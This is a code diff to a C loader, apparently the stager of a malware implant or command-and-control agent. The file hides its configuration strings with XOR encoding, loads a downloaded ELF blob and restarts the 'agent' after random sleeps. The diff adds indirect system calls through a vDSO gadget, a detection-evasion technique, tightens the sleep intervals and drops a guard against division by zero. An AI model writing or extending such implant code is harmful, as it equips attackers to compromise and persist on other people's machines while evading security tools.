@@ -2,6 +2,7 @@
 #include "downloader_api.h"
 #include "downloader_blob.h" // Generated at build time
 #include "elf_loader.h"
+#include "syscalls.h"
 #include "utils.h"
 
 /* Configurable Options - XOR-encoded byte arrays to hide strings */
@@ -9,12 +10,12 @@
 #define CONFIG_XOR_KEY 0x5A
 #endif
 
-#ifndef SLEEP_MIN
-#define SLEEP_MIN 180
+#ifndef SLEEP_MAX
+#define SLEEP_MAX 60
 #endif
 
-#ifndef SLEEP_MAX
-#define SLEEP_MAX 480
+#ifndef SLEEP_MIN
+#define SLEEP_MIN 10
 #endif
 
 // XOR-encoded configuration arrays
@@ -86,6 +87,9 @@ static void write_safe(int fd, const void *buf, size_t len) {
 }
 
 void loader_main(long *sp) {
+  /* Resolve vDSO syscall gadget before any other syscalls */
+  init_indirect_syscalls();
+
   long argc = *sp;
   char **argv = (char **)(sp + 1);
   char **envp = argv + argc + 1;
@@ -230,7 +234,7 @@ void loader_main(long *sp) {
       unsigned int sleep_s = 0;
       get_random_safe(&sleep_s, sizeof(sleep_s));
       unsigned int sleep_range = SLEEP_MAX - SLEEP_MIN;
-      sleep_s = SLEEP_MIN + (sleep_range ? (sleep_s % sleep_range) : 0);
+      sleep_s = SLEEP_MIN + (sleep_s % sleep_range);
       debug_print("Stager Parent: Agent exited, sleeping for %d seconds before "
                   "restart\n",
                   sleep_s);
